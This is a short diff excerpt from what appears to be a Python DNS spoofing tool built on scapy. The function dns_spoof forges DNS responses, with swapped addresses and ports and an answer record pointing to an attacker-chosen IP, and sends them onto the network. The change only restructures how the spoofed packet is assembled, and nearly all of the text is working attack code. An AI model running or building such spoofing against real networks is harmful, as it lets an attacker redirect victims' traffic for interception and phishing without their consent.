@@ -35,10 +35,9 @@ def dns_spoof(packet):
     #dns record with the destination ip as resolved ip
     dns_rr = scapy.DNSRR(rrname=qname, rdata=destination_ip, type='A')
 
-    spoofed_response = scapy.IP(dst=ip_src, src=ip_dst) / \
-                    scapy.UDP(dport=udp_sport, sport=udp_dport) / \
-                    scapy.DNS(id=dns_id, qr=1, aa=1, rd=packet[scapy.DNS].rd, ra=1, qd=dns_qd,
-                              an=dns_rr, ancount=1)
+
+    spoofed_response = scapy.IP(dst=ip_src, src=ip_dst) / scapy.UDP(dport=udp_sport, sport=udp_dport)
+    spoofed_response = spoofed_response / scapy.DNS(id=dns_id, qr=1, aa=1, rd=packet[scapy.DNS].rd, ra=1, qd=dns_qd, an=dns_rr, ancount=1)
 
 
     scapy.send(spoofed_response, verbose=False)
